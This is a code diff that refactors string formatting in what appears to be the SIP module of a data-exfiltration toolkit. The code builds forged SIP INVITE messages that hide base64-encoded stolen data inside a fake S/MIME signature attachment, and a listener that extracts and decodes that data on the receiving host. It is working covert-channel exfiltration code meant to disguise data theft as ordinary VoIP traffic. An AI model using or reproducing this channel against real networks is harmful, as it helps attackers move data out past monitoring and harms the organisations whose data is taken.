@@ -59,21 +59,27 @@ class SIPDialog:
 
     def invite(self, uac, uas, payload):
         #Call-ID magic identifier
-        self.call_id = self.call_id[:3] + "42" + self.call_id[5:]
+        self.call_id = f"{self.call_id[:3]}42{self.call_id[5:]}"
         #Branch magic identifier
-        self.branch = self.branch[:11] + "42" + self.branch[13:]
+        self.branch = f"{self.branch[:11]}42{self.branch[13:]}"
         self.uac = uac
         self.uas = uas
         self.proxy = self.proxy or '127.0.0.1' #keep calm & blame misconfiguration
         packet = sip.Request()
         #forge headers
-        packet.uri = 'sip:' + self.uas.alias + '@'+ self.uas.ip
-        packet.headers['Via'] = 'SIP/2.0/UDP {}:{};branch={}'.format(self.proxy, self.uac.port, self.branch)
+        packet.uri = f'sip:{self.uas.alias}@{self.uas.ip}'
+        packet.headers[
+            'Via'
+        ] = f'SIP/2.0/UDP {self.proxy}:{self.uac.port};branch={self.branch}'
         packet.headers['Max-Forwards'] = 70
-        packet.headers['CSeq'] = '20 ' + packet.method
-        packet.headers['From'] = '{} <sip:{}@{}>;tag={}'.format(self.uac.alias.capitalize(), self.uac.alias, self.uac.ip, self.uac.tag)
-        packet.headers['To'] = '{} <sip:{}@{}>'.format(self.uas.alias.capitalize(), self.uas.alias, self.uas.ip)
-        packet.headers['Contact'] = '<sip:{}@{}>'.format(self.uac.alias, self.uac.ip)
+        packet.headers['CSeq'] = f'20 {packet.method}'
+        packet.headers[
+            'From'
+        ] = f'{self.uac.alias.capitalize()} <sip:{self.uac.alias}@{self.uac.ip}>;tag={self.uac.tag}'
+        packet.headers[
+            'To'
+        ] = f'{self.uas.alias.capitalize()} <sip:{self.uas.alias}@{self.uas.ip}>'
+        packet.headers['Contact'] = f'<sip:{self.uac.alias}@{self.uac.ip}>'
         packet.headers['Call-ID'] = self.call_id
         packet.headers['User-Agent'] = self.uac.user_agent
         packet.headers['Subject'] = self.subject
@@ -81,9 +87,9 @@ class SIPDialog:
         packet.headers['Allow'] = 'INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, NOTIFY, MESSAGE, SUBSCRIBE, INFO'
         #forge the sdp message
         sdp_content =  "v=0\r\n"
-        sdp_content += "o=" + self.uac.alias + " 99 939 IN IP4 " + self.uac.ip + "\r\n"
+        sdp_content += f"o={self.uac.alias} 99 939 IN IP4 {self.uac.ip}" + "\r\n"
         sdp_content += "s=Talk\r\n"
-        sdp_content += "c=IN IP4 " + self.uac.ip + "\r\n"
+        sdp_content += f"c=IN IP4 {self.uac.ip}" + "\r\n"
         sdp_content += "t=0 0\r\n"
         sdp_content += "m=audio 7078 RTP/AVP 124 111 110 0 8 101\r\n"
         sdp_content += "a=rtpmap:124 opus/48000\r\n"
@@ -100,25 +106,28 @@ class SIPDialog:
         sdp_content += "a=fmtp:99 profile-level-id=3\r\n"
         #forge sdp header
         sdp_hdr = "Content-Type: message/sip\r\n"
-        sdp_hdr += "Content-Length: " + str(len(sdp_content)) + '\r\n'
-        sdp_hdr += "INVITE sip:{}@{} SIP/2.0".format(self.uas.alias, self.uas.ip)
+        sdp_hdr += f"Content-Length: {len(sdp_content)}" + '\r\n'
+        sdp_hdr += f"INVITE sip:{self.uas.alias}@{self.uas.ip} SIP/2.0"
         sdp_hdr += packet.pack_hdr()
         sdp_hdr += "\r\n"
-        #forge the false signature
-        sig = 'Content-Type: application/x-pkcs7-signature; name="smime.p7s"\r\n'
-        sig += 'Content-Transfer-Encoding: base64\r\n'
+        sig = (
+            'Content-Type: application/x-pkcs7-signature; name="smime.p7s"\r\n'
+            + 'Content-Transfer-Encoding: base64\r\n'
+        )
         sig += 'Content-Disposition: attachment; filename="smime.p7s"; handling=required\r\n'
         sig += base64.b64encode(payload)
         #forge sip body
         boundary = ''.join(random.sample(string.digits + string.ascii_letters, 20))
-        packet.body = '--' + boundary + '\r\n'
+        packet.body = f'--{boundary}' + '\r\n'
         packet.body += sdp_hdr
         packet.body += sdp_content + '\r\n'
-        packet.body += '--' + boundary + '\r\n'
+        packet.body += f'--{boundary}' + '\r\n'
         packet.body += sig + '\r\n'
-        packet.body += '--' + boundary + '--'
+        packet.body += f'--{boundary}--'
         #replace sip header content-type with multipart/signed
-        packet.headers['Content-Type'] = 'multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary=' + boundary
+        packet.headers[
+            'Content-Type'
+        ] = f'multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary={boundary}'
         #Update Content-Length
         packet.headers['Content-Length'] = str(len(packet.body))
 
@@ -144,10 +153,10 @@ class SIPDialog:
         packet.reason = 'Ringing'
         packet.headers['Via'] = invite.headers['via']
         packet.headers['From'] = invite.headers['from']
-        packet.headers['To'] = invite.headers['to'] + ';tag={}'.format(self.uac.tag)
+        packet.headers['To'] = invite.headers['to'] + f';tag={self.uac.tag}'
         packet.headers['Call-ID'] = invite.headers['call-id']
         packet.headers['CSeq'] = invite.headers['cseq']
-        packet.headers['Contact'] = '<sip:{}@{}>'.format(self.uac.alias, self.uac.ip)
+        packet.headers['Contact'] = f'<sip:{self.uac.alias}@{self.uac.ip}>'
         packet.headers['User-Agent'] = self.uac.user_agent
         packet.headers['Content-Length'] = '0'
 
@@ -158,7 +167,7 @@ class SIPDialog:
         packet.status = '603'
         packet.reason = 'Decline'
         packet.headers['From'] = invite.headers['from']
-        packet.headers['To'] = invite.headers['to'] + ';tag={}'.format(self.uac.tag)
+        packet.headers['To'] = invite.headers['to'] + f';tag={self.uac.tag}'
         packet.headers['Call-ID'] = invite.headers['call-id']
         packet.headers['CSeq'] = invite.headers['cseq']
         packet.headers['User-Agent'] = self.uac.user_agent
@@ -169,7 +178,7 @@ class SIPDialog:
     def ack(self, message):
         packet = sip.Request()
         packet.method = 'ACK'
-        packet.uri = 'sip:{}@{}'.format(self.uas.alias, self.uas.ip)
+        packet.uri = f'sip:{self.uas.alias}@{self.uas.ip}'
         packet.headers['Via'] = message.headers['via']
         packet.headers['From'] = message.headers['from']
         packet.headers['To'] = message.headers['to']
@@ -204,13 +213,12 @@ def listen():
                     parser = re.compile('boundary=(.*)')
                     [boundary] = re.findall(parser, req.headers['content-type'])
                     #Hackish payload isolation
-                    payload = req.body.split('--'+boundary)[-2].split('\r\n')[-2]
+                    payload = req.body.split(f'--{boundary}')[-2].split('\r\n')[-2]
                     app_exfiltrate.log_message('info', "[sip] Received {0} bytes from {1}".format(len(payload), addr[0]))
                     app_exfiltrate.retrieve_data(base64.b64decode(payload))
         except Exception as e:
             print(traceback.format_exc())
-            print('exception: ' + repr(e))
-            pass
+            print(f'exception: {repr(e)}')
 
 def send(data):
     if config.has_key('proxies') and config['proxies'] != [""]:
